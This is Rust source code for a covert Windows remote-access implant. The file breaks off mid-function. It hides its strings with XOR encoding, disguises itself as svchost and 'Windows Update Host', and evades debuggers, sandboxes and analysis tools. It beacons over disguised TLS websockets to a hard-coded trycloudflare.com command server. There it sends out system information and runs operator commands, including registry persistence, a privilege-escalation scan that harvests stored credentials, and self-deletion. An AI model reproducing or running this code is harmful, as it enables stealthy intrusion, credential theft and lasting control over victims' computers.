#![allow(clippy::needless_range_loop)]
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use std::env;

use std::net::{TcpStream, ToSocketAddrs};
use std::sync::Arc;
use std::time::Duration;

const XOR_KEY: [u8; 8] = [0xAB, 0x3F, 0xD7, 0x52, 0x91, 0xE4, 0x18, 0x6C];

const fn xor_encode<const N: usize>(input: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N { out[i] = input[i] ^ XOR_KEY[i % 8]; i += 1; }
    out
}

fn xor_decode(encoded: &[u8]) -> Vec<u8> {
    encoded.iter().enumerate().map(|(i, b)| b ^ XOR_KEY[i % 8]).collect()
}

fn xd(encoded: &[u8]) -> String {
    String::from_utf8_lossy(&xor_decode(encoded)).to_string()
}

// C2
const ENC_C2_HOST: [u8; 47] = xor_encode(b"nav-plane-simpson-experiments.trycloudflare.com");
const ENC_C2_PORT: [u8; 3] = xor_encode(b"443");
const ENC_SNI_DOMAIN: [u8; 47] = xor_encode(b"nav-plane-simpson-experiments.trycloudflare.com");
// WS path rotation (blend with legitimate traffic)
const ENC_WS_PATH_0: [u8; 14] = xor_encode(b"/api/v2/events");
const ENC_WS_PATH_1: [u8; 37] = xor_encode(b"/socket.io/?EIO=4&transport=websocket");
const ENC_WS_PATH_2: [u8; 8] = xor_encode(b"/graphql");
const ENC_WS_PATH_3: [u8; 23] = xor_encode(b"/realtime/notifications");
const ENC_WS_PATH_4: [u8; 18] = xor_encode(b"/connect/websocket");

// Executables
const ENC_CMD_EXE: [u8; 7] = xor_encode(b"cmd.exe");

// Process masquerade
const ENC_MASQ_TITLE: [u8; 19] = xor_encode(b"Windows Update Host");
const ENC_MASQ_CMD: [u8; 45] = xor_encode(b"C:\\Windows\\System32\\svchost.exe -k netsvcs -p");

// Builtins
const ENC_BI_WHOAMI: [u8; 6] = xor_encode(b"whoami");
const ENC_BI_HOSTNAME: [u8; 8] = xor_encode(b"hostname");
const ENC_BI_DIR: [u8; 3] = xor_encode(b"dir");
const ENC_BI_TYPE: [u8; 4] = xor_encode(b"type");
const ENC_BI_TASKLIST: [u8; 8] = xor_encode(b"tasklist");
const ENC_BI_IPCONFIG: [u8; 8] = xor_encode(b"ipconfig");
const ENC_BI_NETSTAT: [u8; 7] = xor_encode(b"netstat");
const ENC_BI_SYSTEMINFO: [u8; 10] = xor_encode(b"systeminfo");
const ENC_BI_NET: [u8; 3] = xor_encode(b"net");
const ENC_BI_REG: [u8; 3] = xor_encode(b"reg");
const ENC_BI_CD: [u8; 2] = xor_encode(b"cd");
const ENC_BI_PWD: [u8; 3] = xor_encode(b"pwd");
const ENC_BI_ENV: [u8; 3] = xor_encode(b"set");
const ENC_BI_PS: [u8; 2] = xor_encode(b"ps");
const ENC_BI_KILL: [u8; 4] = xor_encode(b"kill");
const ENC_BI_PERSIST: [u8; 7] = xor_encode(b"persist");
const ENC_BI_SLEEP: [u8; 5] = xor_encode(b"sleep");
const ENC_BI_EXIT: [u8; 4] = xor_encode(b"exit");
const ENC_BI_SYSINFO: [u8; 4] = xor_encode(b"info");
const ENC_BI_PRIVESC: [u8; 2] = xor_encode(b"pe");

// Persistence
const ENC_REG_RUN: [u8; 52] = xor_encode(b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run       ");
const ENC_PERSIST_NAME: [u8; 16] = xor_encode(b"WindowsUpdateSvc");

// User-Agent
const ENC_UA: [u8; 111] = xor_encode(b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");

// Dynamic API resolution (encoded to hide from import table)
const ENC_NTDLL: [u8; 9] = xor_encode(b"ntdll.dll");
const ENC_K32: [u8; 12] = xor_encode(b"kernel32.dll");
const ENC_ADV32: [u8; 12] = xor_encode(b"advapi32.dll");
const ENC_NTQIP: [u8; 25] = xor_encode(b"NtQueryInformationProcess");
const ENC_RTLGV: [u8; 13] = xor_encode(b"RtlGetVersion");
const ENC_FN_VQ: [u8; 12] = xor_encode(b"VirtualQuery");
const ENC_FN_CTHS: [u8; 24] = xor_encode(b"CreateToolhelp32Snapshot");
const ENC_FN_P32F: [u8; 15] = xor_encode(b"Process32FirstW");
const ENC_FN_P32N: [u8; 14] = xor_encode(b"Process32NextW");
const ENC_FN_OP: [u8; 11] = xor_encode(b"OpenProcess");
const ENC_FN_TP: [u8; 16] = xor_encode(b"TerminateProcess");
const ENC_FN_OPT: [u8; 16] = xor_encode(b"OpenProcessToken");
const ENC_FN_GTI: [u8; 19] = xor_encode(b"GetTokenInformation");
const ENC_FN_ROKE: [u8; 15] = xor_encode(b"RegOpenKeyExW  ");
const ENC_FN_RSVE: [u8; 16] = xor_encode(b"RegSetValueExW  ");
const ENC_FN_RQVE: [u8; 16] = xor_encode(b"RegQueryValueExW");
const ENC_FN_RCK: [u8; 11] = xor_encode(b"RegCloseKey");

const ENC_USERNAME: [u8; 8] = xor_encode(b"USERNAME");

// Analysis tools (encoded)
const ENC_T1: [u8; 9] = xor_encode(b"wireshark");
const ENC_T2: [u8; 7] = xor_encode(b"procmon");
const ENC_T3: [u8; 3] = xor_encode(b"ida");
const ENC_T4: [u8; 6] = xor_encode(b"x64dbg");
const ENC_T5: [u8; 7] = xor_encode(b"ollydbg");
const ENC_T6: [u8; 7] = xor_encode(b"fiddler");
const ENC_T7: [u8; 13] = xor_encode(b"processhacker");
const ENC_T8: [u8; 5] = xor_encode(b"dnspy");
const ENC_T9: [u8; 6] = xor_encode(b"ghidra");

// Sandbox usernames (encoded)
const ENC_SN1: [u8; 7] = xor_encode(b"sandbox");
const ENC_SN2: [u8; 7] = xor_encode(b"malware");
const ENC_SN3: [u8; 5] = xor_encode(b"virus");
const ENC_SN4: [u8; 6] = xor_encode(b"sample");
const ENC_SN5: [u8; 4] = xor_encode(b"test");
const ENC_SN6: [u8; 7] = xor_encode(b"analyst");

// Privesc scan strings (encoded)
const ENC_WHOAMI_PRIV: [u8; 12] = xor_encode(b"whoami /priv");
const ENC_SE_IMP: [u8; 13] = xor_encode(b"SeImpersonate");
const ENC_SE_DBG: [u8; 7] = xor_encode(b"SeDebug");
const ENC_SE_BAK: [u8; 8] = xor_encode(b"SeBackup");
const ENC_SE_RST: [u8; 9] = xor_encode(b"SeRestore");
const ENC_SE_TOW: [u8; 15] = xor_encode(b"SeTakeOwnership");
const ENC_SE_LDR: [u8; 12] = xor_encode(b"SeLoadDriver");
const ENC_SE_TCB: [u8; 5] = xor_encode(b"SeTcb");
const ENC_SE_ASN: [u8; 16] = xor_encode(b"SeAssignPrimary ");
const ENC_ENABLED: [u8; 7] = xor_encode(b"Enabled");
const ENC_WMIC_SVC: [u8; 42] = xor_encode(b"wmic service get name,pathname,startmode  ");
const ENC_PROG_FILES: [u8; 13] = xor_encode(b"Program Files");
const ENC_REG_AIE_LM: [u8; 85] = xor_encode(b"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
const ENC_REG_AIE_CU: [u8; 85] = xor_encode(b"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
const ENC_0X1: [u8; 3] = xor_encode(b"0x1");
const ENC_CMDKEY: [u8; 12] = xor_encode(b"cmdkey /list");
const ENC_TARGET: [u8; 7] = xor_encode(b"Target:");
const ENC_WINLOGON_KEY: [u8; 63] = xor_encode(b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon          ");
const ENC_DEFPW_VAL: [u8; 15] = xor_encode(b"DefaultPassword");


// Mutex name for single-instance check
const ENC_MUTEX: [u8; 30] = xor_encode(b"Global\\{e4a7c2d1-9f3b-4e8a-b6}");

const ENC_ENV_USERDOMAIN: [u8; 10] = xor_encode(b"USERDOMAIN");
const ENC_ENV_COMPUTERNAME: [u8; 12] = xor_encode(b"COMPUTERNAME");
const ENC_ENV_OS: [u8; 2] = xor_encode(b"OS");
const ENC_ENV_ARCH: [u8; 22] = xor_encode(b"PROCESSOR_ARCHITECTURE");
const ENC_ENV_APPDATA: [u8; 7] = xor_encode(b"APPDATA");

#[used]
static _RES_TABLE: [u8; 2048] = {
    let mut buf = [0u8; 2048];
    let pat: &[u8] = b"Microsoft Visual C++ Runtime Library - Copyright (c) Microsoft Corporation. All rights reserved. This software is subject to the terms of the license agreement. Redistribution and use in source and binary forms are permitted provided that the following conditions are met. The above copyright notice shall be included in all copies. THIS SOFTWARE IS PROVIDED AS IS WITHOUT WARRANTY. ";
    let mut i = 0;
    while i < 2048 {
        buf[i] = pat[i % pat.len()];
        i += 1;
    }
    buf
};

const INITIAL_SLEEP_MS: u64 = 5000;
const MAX_SLEEP_MS: u64 = 300_000;
const SESSION_MIN_MS: u64 = 120_000;
const SESSION_MAX_MS: u64 = 600_000;
const WORK_HOUR_START: u32 = 7;
const WORK_HOUR_END: u32 = 23;

fn dbg_log(msg: &str) {
    if env::var("ERSDBG").is_ok() {
        use std::io::Write;
        let path = format!("{}\\ers_debug.log",
            env::var("TEMP").unwrap_or_else(|_| "C:\\Users\\Public".into()));
        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(&path) {
            let _ = writeln!(f, "[{}] {}", chrono_lite(), msg);
            let _ = f.flush();
        }
    }
}

fn chrono_lite() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    format!("{}", secs)
}

fn main() {
    if env::var("ERSDBG").is_ok() {
        std::panic::set_hook(Box::new(|info| {
            dbg_log(&format!("PANIC: {}", info));
        }));
    }

    #[cfg(target_os = "windows")]
    {
        unsafe {
            let hwnd = windows_sys::Win32::System::Console::GetConsoleWindow();
            if hwnd != std::ptr::null_mut() {
                windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(hwnd, 0);
            }
        }
    }

    dbg_log("== START ==");

    if !acquire_mutex() { dbg_log("FAIL: mutex"); return; }
    dbg_log("OK: mutex");

    masquerade();

    // Sandbox/timing check — disable with env var for testing in VMs
    if env::var("NOCHECK").is_err() {
        if timing_check() { dbg_log("FAIL: timing_check"); mimic_exit(); return; }
        if detect_sandbox() { dbg_log("FAIL: sandbox"); mimic_exit(); return; }
    }
    dbg_log("OK: checks passed");

    let mut sleep_ms = INITIAL_SLEEP_MS;
    let mut conn_count: u64 = 0;

    loop {
        if is_debugged() {
            dbg_log("WARN: debugger detected");
            sleep_encrypted(60_000);
            continue;
        }

        if !is_work_hours() {
            dbg_log("WARN: outside work hours");
            sleep_encrypted(60_000);
            continue;
        }

        dbg_log(&format!("CONN: attempt #{}", conn_count));
        match connect_and_run(conn_count) {
            Ok(_) => { dbg_log("CONN: ok"); sleep_ms = INITIAL_SLEEP_MS; }
            Err(e) => { dbg_log(&format!("CONN: error = {}", e)); sleep_ms = (sleep_ms * 2).min(MAX_SLEEP_MS); }
        }
        conn_count = conn_count.wrapping_add(1);

        let u: f64 = rand::random::<f64>().max(0.001);
        let poisson = -(sleep_ms as f64) * u.ln();
        let actual = (poisson as u64).clamp(sleep_ms / 4, sleep_ms * 3);
        dbg_log(&format!("SLEEP: {}ms", actual));
        sleep_encrypted(actual);
    }
}

#[cfg(target_os = "windows")]
fn acquire_mutex() -> bool {
    unsafe {
        let name = xd(&ENC_MUTEX);
        let wide: Vec<u16> = name.encode_utf16().chain(std::iter::once(0)).collect();
        let h = windows_sys::Win32::System::Threading::CreateMutexW(
            std::ptr::null(), 1, wide.as_ptr());
        if h.is_null() { return false; }
        windows_sys::Win32::Foundation::GetLastError() != 183 // ERROR_ALREADY_EXISTS
    }
}

#[cfg(not(target_os = "windows"))]
fn acquire_mutex() -> bool { true }

fn resolve_fn(dll_enc: &[u8], name_enc: &[u8]) -> Option<usize> {
    #[cfg(target_os = "windows")]
    unsafe {
        let dll = xd(dll_enc);
        let wide: Vec<u16> = dll.encode_utf16().chain(std::iter::once(0)).collect();
        let mut h = windows_sys::Win32::System::LibraryLoader::GetModuleHandleW(wide.as_ptr());
        if h.is_null() {
            h = windows_sys::Win32::System::LibraryLoader::LoadLibraryW(wide.as_ptr());
            if h.is_null() { return None; }
        }
        let name = xor_decode(name_enc);
        let mut cname = name.clone();
        cname.push(0);
        let p = windows_sys::Win32::System::LibraryLoader::GetProcAddress(h, cname.as_ptr());
        p.map(|f| f as usize)
    }
    #[cfg(not(target_os = "windows"))]
    { let _ = (dll_enc, name_enc); None }
}

fn is_debugged() -> bool {
    #[cfg(target_os = "windows")]
    unsafe {
        if windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent() != 0 {
            return true;
        }
        if let Some(addr) = resolve_fn(&ENC_NTDLL, &ENC_NTQIP) {
            type NtQIP = unsafe extern "system" fn(isize, u32, *mut u8, u32, *mut u32) -> i32;
            let nt_qip: NtQIP = std::mem::transmute(addr);
            let mut debug_port: isize = 0;
            let status = nt_qip(
                windows_sys::Win32::System::Threading::GetCurrentProcess() as isize,
                7,
                &mut debug_port as *mut _ as *mut u8,
                std::mem::size_of::<isize>() as u32,
                std::ptr::null_mut(),
            );
            if status == 0 && debug_port != 0 { return true; }
        }
    }
    false
}

fn timing_check() -> bool {
    let t1 = std::time::Instant::now();
    let mut x: u64 = 0;
    for i in 0u64..1000 { x = x.wrapping_add(i); }
    let _ = x;
    let elapsed = t1.elapsed().as_micros();
    elapsed > 50_000
}

fn mimic_exit() {
    std::thread::sleep(Duration::from_secs(rand::random::<u64>() % 120 + 60));
}

fn masquerade() {
    #[cfg(target_os = "windows")]
    unsafe {
        let title = xd(&ENC_MASQ_TITLE);
        let wide: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
        windows_sys::Win32::System::Console::SetConsoleTitleW(wide.as_ptr());

        let peb: *mut MyPEB = get_peb();
        if !peb.is_null() {
            let params = (*peb).ProcessParameters;
            if !params.is_null() {
                let fake = xd(&ENC_MASQ_CMD);
                let wide: Vec<u16> = fake.encode_utf16().collect();
                let byte_len = (wide.len() * 2) as u16;
                let buf = (*params).CommandLine.Buffer;
                if !buf.is_null() {
                    let max = (*params).CommandLine.MaximumLength;
                    let copy = byte_len.min(max) as usize;
                    std::ptr::copy_nonoverlapping(wide.as_ptr(), buf, copy / 2);
                    (*params).CommandLine.Length = copy as u16;
                }
            }
        }
    }
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct MyPEB {
    _pad1: [u8; 32],
    ProcessParameters: *mut MyRTL_PARAMS,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct MyRTL_PARAMS {
    _pad: [u8; 112],
    CommandLine: MyUSTR,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct MyUSTR {
    Length: u16,
    MaximumLength: u16,
    _pad: u32,
    Buffer: *mut u16,
}

#[cfg(target_os = "windows")]
unsafe fn get_peb() -> *mut MyPEB {
    let peb: *mut MyPEB;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}

fn detect_sandbox() -> bool {
    let mut score = 0u32;

    #[cfg(target_os = "windows")]
    unsafe {
        // CPU core count (in-process)
        let mut sysinfo: windows_sys::Win32::System::SystemInformation::SYSTEM_INFO = std::mem::zeroed();
        windows_sys::Win32::System::SystemInformation::GetSystemInfo(&mut sysinfo);
        if sysinfo.dwNumberOfProcessors < 2 { score += 3; }

        // Uptime (in-process)
        let ticks = windows_sys::Win32::System::SystemInformation::GetTickCount64();
        if ticks < 10 * 60 * 1000 { score += 3; }

        // RAM (in-process via GlobalMemoryStatusEx)
        #[repr(C)]
        struct MemStatusEx { len: u32, load: u32, total_phys: u64, avail_phys: u64,
            total_page: u64, avail_page: u64, total_virt: u64, avail_virt: u64, avail_ext: u64 }
        let mut mem = MemStatusEx { len: 64, load: 0, total_phys: 0, avail_phys: 0,
            total_page: 0, avail_page: 0, total_virt: 0, avail_virt: 0, avail_ext: 0 };
        windows_sys::Win32::System::SystemInformation::GlobalMemoryStatusEx(
            &mut mem as *mut _ as *mut _);
        if mem.total_phys < 2_000_000_000 { score += 2; }

        // Disk size (in-process via GetDiskFreeSpaceExW)
        let cpath: [u16; 4] = [b'C' as u16, b':' as u16, b'\\' as u16, 0];
        let mut total_bytes: u64 = 0;
        windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW(
            cpath.as_ptr(), std::ptr::null_mut(),
            &mut total_bytes as *mut u64 as *mut _,
            std::ptr::null_mut());
        if total_bytes < 40_000_000_000 { score += 2; }

        // Process enumeration via dynamically-resolved ToolHelp (hidden from import table)
        type FnCTHS = unsafe extern "system" fn(u32, u32) -> isize;
        type FnP32W = unsafe extern "system" fn(isize, *mut [u8; 568]) -> i32; // PROCESSENTRY32W is 568 bytes
        if let (Some(a_cths), Some(a_p32f), Some(a_p32n)) = (
            resolve_fn(&ENC_K32, &ENC_FN_CTHS),
            resolve_fn(&ENC_K32, &ENC_FN_P32F),
            resolve_fn(&ENC_K32, &ENC_FN_P32N),
        ) {
            let cths: FnCTHS = std::mem::transmute(a_cths);
            let p32f: FnP32W = std::mem::transmute(a_p32f);
            let p32n: FnP32W = std::mem::transmute(a_p32n);
            let snap = cths(0x2, 0); // TH32CS_SNAPPROCESS
            if snap != -1 {
                let mut pe: windows_sys::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32W = std::mem::zeroed();
                pe.dwSize = std::mem::size_of_val(&pe) as u32;
                let pe_ptr = &mut pe as *mut _ as *mut [u8; 568];
                let mut proc_count = 0u32;
                let tools: &[&[u8]] = &[&ENC_T1, &ENC_T2, &ENC_T3, &ENC_T4, &ENC_T5,
                                         &ENC_T6, &ENC_T7, &ENC_T8, &ENC_T9];
                if p32f(snap, pe_ptr) != 0 {
                    loop {
                        proc_count += 1;
                        let nlen = pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                        let name = String::from_utf16_lossy(&pe.szExeFile[..nlen]).to_lowercase();
                        for t in tools {
                            if name.contains(&xd(t).to_lowercase()) { score += 4; }
                        }
                        if p32n(snap, pe_ptr) == 0 { break; }
                    }
                }
                windows_sys::Win32::Foundation::CloseHandle(snap as *mut std::ffi::c_void);
                if proc_count < 30 { score += 3; }
            }
        }
    }

    // Username (in-process)
    if let Ok(user) = env::var(xd(&ENC_USERNAME)) {
        let ul = user.to_lowercase();
        let names: &[&[u8]] = &[&ENC_SN1, &ENC_SN2, &ENC_SN3, &ENC_SN4, &ENC_SN5, &ENC_SN6];
        for n in names {
            if ul == xd(n) { score += 3; }
        }
    }

    score >= 12
}

#[derive(Debug)]
struct NoVerify;

impl rustls::client::danger::ServerCertVerifier for NoVerify {
    fn verify_server_cert(
        &self, _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8], _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::aws_lc_rs::default_provider().signature_verification_algorithms.supported_schemes()
    }
}

fn pick_ws_path(conn: u64) -> String {
    let paths: &[&[u8]] = &[&ENC_WS_PATH_0, &ENC_WS_PATH_1, &ENC_WS_PATH_2, &ENC_WS_PATH_3, &ENC_WS_PATH_4];
    let idx = (conn as usize) % paths.len();
    xd(paths[idx]).trim().to_string()
}

fn build_tls_config() -> Arc<rustls::ClientConfig> {
    use rustls::crypto::aws_lc_rs::cipher_suite;
    let chrome_suites = vec![
        cipher_suite::TLS13_AES_128_GCM_SHA256,
        cipher_suite::TLS13_AES_256_GCM_SHA384,
        cipher_suite::TLS13_CHACHA20_POLY1305_SHA256,
        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
        cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
        cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        cipher_suite::TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
        cipher_suite::TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
    ];
    let provider = rustls::crypto::CryptoProvider {
        cipher_suites: chrome_suites,
        ..rustls::crypto::aws_lc_rs::default_provider()
    };
    Arc::new(
        rustls::ClientConfig::builder_with_provider(Arc::new(provider))
            .with_safe_default_protocol_versions()
            .unwrap()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(NoVerify))
            .with_no_client_auth()
    )
}

fn connect_and_run(conn_count: u64) -> Result<(), Box<dyn std::error::Error>> {
    let host = xd(&ENC_C2_HOST).trim().to_string();
    let port = xd(&ENC_C2_PORT).trim().to_string();
    let path = pick_ws_path(conn_count);

    dbg_log(&format!("C2: host={} port={} path={}", host, port, path));

    let addr = format!("{}:{}", host, port);
    let sock_addr = match addr.to_socket_addrs() {
        Ok(mut addrs) => match addrs.next() {
            Some(a) => { dbg_log(&format!("DNS: resolved to {}", a)); a }
            None => { dbg_log("DNS: no addresses returned"); return Err("DNS empty".into()); }
        },
        Err(e) => { dbg_log(&format!("DNS: failed: {}", e)); return Err(e.into()); }
    };

    let tcp = match TcpStream::connect_timeout(&sock_addr, Duration::from_secs(10)) {
        Ok(t) => { dbg_log("TCP: connected"); t }
        Err(e) => { dbg_log(&format!("TCP: failed: {}", e)); return Err(e.into()); }
    };
    tcp.set_nodelay(true)?;

    let tls_config = build_tls_config();

    let sni = xd(&ENC_SNI_DOMAIN).trim().to_string();
    dbg_log(&format!("TLS: sni={}", sni));
    let server_name: rustls::pki_types::ServerName<'static> = sni.clone().try_into()
        .unwrap_or_else(|_| {
            let ip: std::net::IpAddr = host.parse().expect("invalid host");
            rustls::pki_types::ServerName::IpAddress(ip.into())
        });
    let tls_conn = match rustls::ClientConnection::new(tls_config, server_name) {
        Ok(c) => { dbg_log("TLS: client created"); c }
        Err(e) => { dbg_log(&format!("TLS: failed: {}", e)); return Err(e.into()); }
    };
    let tls_stream = rustls::StreamOwned::new(tls_conn, tcp);
    dbg_log("TLS: stream ready");

    let accept_lang = match conn_count % 3 {
        0 => "en-US,en;q=0.9",
        1 => "en-GB,en;q=0.9,en-US;q=0.8",
        _ => "en-US,en;q=0.9,fr;q=0.8",
    };

    let ws_url = if port == "443" {
        format!("wss://{}{}", sni, path)
    } else {
        format!("wss://{}:{}{}", sni, port, path)
    };
    dbg_log(&format!("WS: url={}", ws_url));
    let request = tungstenite::http::Request::builder()
        .uri(&ws_url)
        .header("Host", &sni)
        .header("User-Agent", xd(&ENC_UA).trim())
        .header("Origin", format!("https://{}", sni))
        .header("Accept-Language", accept_lang)
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Cache-Control", "no-cache")
        .header("Pragma", "no-cache")
        .header("Sec-Fetch-Dest", "websocket")
        .header("Sec-Fetch-Mode", "websocket")
        .header("Sec-Fetch-Site", "same-origin")
        .header("Connection", "Upgrade")
        .header("Upgrade", "websocket")
        .header("Sec-WebSocket-Version", "13")
        .header("Sec-WebSocket-Key", tungstenite::handshake::client::generate_key())
        .body(())?;

    let (mut ws, _) = match tungstenite::client::client(request, tls_stream) {
        Ok(r) => { dbg_log("WS: handshake ok"); r }
        Err(e) => { dbg_log(&format!("WS: handshake failed: {}", e)); return Err(e.into()); }
    };

    let info = gather_system_info();
    dbg_log(&format!("WS: sending info ({} bytes)", info.len()));
    ws.send(tungstenite::Message::Text(info))?;
    dbg_log("WS: info sent, entering command loop");

    let session_limit = SESSION_MIN_MS
        + (rand::random::<u64>() % (SESSION_MAX_MS - SESSION_MIN_MS));
    let session_start = std::time::Instant::now();

    loop {
        if session_start.elapsed().as_millis() as u64 > session_limit {
            let _ = ws.close(None);
            break;
        }

        let msg = ws.read()?;
        match msg {
            tungstenite::Message::Text(cmd) => {
                let cmd = cmd.trim().to_string();
                if cmd.is_empty() { continue; }
                let response = handle_command(&cmd);
                let padded = pad_response(&response);
                ws.send(tungstenite::Message::Text(padded))?;
            }
            tungstenite::Message::Close(_) => break,
            tungstenite::Message::Ping(d) => { ws.send(tungstenite::Message::Pong(d))?; }
            _ => {}
        }
    }

    Ok(())
}

fn pad_response(data: &str) -> String {
    let len = data.len();
    let target = if len < 256 {
        256 + (rand::random::<usize>() % 512)
    } else if len < 4096 {
        len + 128 + (rand::random::<usize>() % 256)
    } else {
        len
    };
    if target <= len { return data.to_string(); }
    let pad_len = target - len;
    let mut out = String::with_capacity(target + 2);
    out.push_str(data);
    out.push('\x00');
    let fill: Vec<u8> = (0..pad_len).map(|i| {
        b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .,-;:!?()[]{}"
            [(rand::random::<usize>() + i) % 75]
    }).collect();
    out.push_str(&String::from_utf8_lossy(&fill));
    out
}

fn handle_command(cmd: &str) -> String {
    let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
    let base = parts[0].to_lowercase();
    let args = parts.get(1).copied().unwrap_or("");

    if base == xd(&ENC_BI_WHOAMI).trim() && args.is_empty() { return builtin_whoami(); }
    if base == xd(&ENC_BI_HOSTNAME).trim() && args.is_empty() { return builtin_hostname(); }
    if base == xd(&ENC_BI_PWD).trim() || (base == xd(&ENC_BI_CD).trim() && args.is_empty()) {
        return env::current_dir().map(|p| p.to_string_lossy().to_string()).unwrap_or_else(|_| "?".into());
    }
    if base == xd(&ENC_BI_CD).trim() && !args.is_empty() {
        return match env::set_current_dir(args) {
            Ok(_) => env::current_dir().map(|p| p.to_string_lossy().to_string()).unwrap_or_else(|_| "ok".into()),
            Err(e) => format!("err: {}", e),
        };
    }
    if base == xd(&ENC_BI_ENV).trim() && args.is_empty() {
        return env::vars().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("\n");
    }
    if base == xd(&ENC_BI_DIR).trim() {
        return builtin_dir(if args.is_empty() { "." } else { args });
    }
    if base == xd(&ENC_BI_TYPE).trim() && !args.is_empty() {
        return builtin_type(args);
    }
    if base == xd(&ENC_BI_PS).trim() {
        return builtin_ps();
    }
    if base == xd(&ENC_BI_KILL).trim() && !args.is_empty() {
        return builtin_kill(args);
    }
    if base == xd(&ENC_BI_SYSINFO).trim() { return gather_system_info(); }
    if base == xd(&ENC_BI_PERSIST).trim() { return install_persistence(); }
    if base == xd(&ENC_BI_SLEEP).trim() && !args.is_empty() {
        if let Ok(secs) = args.parse::<u64>() {
            sleep_encrypted(secs * 1000);
            return format!("slept {}s", secs);
        }
    }
    if base == xd(&ENC_BI_EXIT).trim() { self_delete(); std::process::exit(0); }
    if base == xd(&ENC_BI_PRIVESC).trim() { return privesc_scan(); }

    exec_command(cmd)
}

fn builtin_whoami() -> String {
    if let Ok(user) = env::var(xd(&ENC_USERNAME)) {
        if let Ok(domain) = env::var(xd(&ENC_ENV_USERDOMAIN)) {
            return format!("{}\\{}", domain, user);
        }
        return user;
    }
    "?".into()
}

fn builtin_hostname() -> String {
    env::var(xd(&ENC_ENV_COMPUTERNAME)).unwrap_or_else(|_| "?".into())
}

fn builtin_dir(path: &str) -> String {
    let mut out = String::new();
    match std::fs::read_dir(path) {
        Ok(entries) => {
            for entry in entries.flatten() {
                let meta = entry.metadata();
                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                let name = entry.file_name().to_string_lossy().to_string();
                if is_dir {
                    out.push_str(&format!("  <DIR>          {}\n", name));
                } else {
                    out.push_str(&format!("  {:>14} {}\n", size, name));
                }
            }
        }
        Err(e) => out.push_str(&format!("err: {}", e)),
    }
    out
}

fn builtin_type(path: &str) -> String {
    match std::fs::read_to_string(path) {
        Ok(content) => {
            if content.len() > 65536 { content[..65536].to_string() }
            else { content }
        }
        Err(e) => format!("err: {}", e),
    }
}

fn builtin_ps() -> String {
    #[cfg(target_os = "windows")]
    unsafe {
        type FnCTHS = unsafe extern "system" fn(u32, u32) -> isize;
        type FnP32W = unsafe extern "system" fn(isize, *mut [u8; 568]) -> i32;
        let (Some(a1), Some(a2), Some(a3)) = (
            resolve_fn(&ENC_K32, &ENC_FN_CTHS),
            resolve_fn(&ENC_K32, &ENC_FN_P32F),
            resolve_fn(&ENC_K32, &ENC_FN_P32N),
        ) else { return "err".into(); };
        let cths: FnCTHS = std::mem::transmute(a1);
        let p32f: FnP32W = std::mem::transmute(a2);
        let p32n: FnP32W = std::mem::transmute(a3);
        let snap = cths(0x2, 0);
        if snap == -1 { return "err".into(); }
        let mut pe: windows_sys::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32W = std::mem::zeroed();
        pe.dwSize = std::mem::size_of_val(&pe) as u32;
        let pe_ptr = &mut pe as *mut _ as *mut [u8; 568];
        let mut out = String::from("PID\tThreads\tName\n");
        if p32f(snap, pe_ptr) != 0 {
            loop {
                let nlen = pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let name = String::from_utf16_lossy(&pe.szExeFile[..nlen]);
